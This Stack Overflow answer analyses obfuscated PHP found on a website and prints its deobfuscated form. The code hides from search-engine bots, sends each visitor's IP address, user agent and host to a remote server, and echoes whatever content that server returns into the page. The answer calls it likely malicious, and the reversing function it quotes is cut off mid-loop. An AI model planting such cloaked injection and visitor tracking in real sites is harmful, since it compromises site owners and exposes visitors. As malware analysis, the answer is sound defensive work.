[site]: stackoverflow
[post_id]: 4035864
[parent_id]: 4035214
[tags]: 
Looks like pretty heavily obfuscated stat-tracking code, but I'm more inclined to say it's malicious. s37 , as noted, reverses the string: function s37($s) { $e = ""; for ($a = 0; $a This, in turn, generates the following code: $z37="stats"; $h37="http"; $c37="in"; $ua3=$_SERVER["HTTP_USER_AGENT"]; $u37 = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler"); if((preg_match("/" . implode("|", $u37) . "/i", $ua3)) or (isset($_COOKIE[$z37]))) { } else { @setcookie($z37,md5("stats"),time()+10800); $url = @file_get_contents($h37.":"."//".$c37.$c37.$c37.$c37.$c37.$c37.$c37.$c37.$c37.".$c37/".$c37.".ph"."p?"."i=".$_SERVER["REMOTE_ADDR"]."&b=".urlencode($ua3)."&h=".urlencode($_SERVER["HTTP_HOST"])); if (strstr($url,"!go!")) { $url = explode("!go!",$url); $url = $url[1]; echo $url; } } The user-agent matching stuff prevents search engine bots from running the code. Otherwise, for browsers, a cookie gets set, then some code gets downloaded from a remote server and echoed out. The purpose of the code that's downloaded is hard to ascertain without more info.
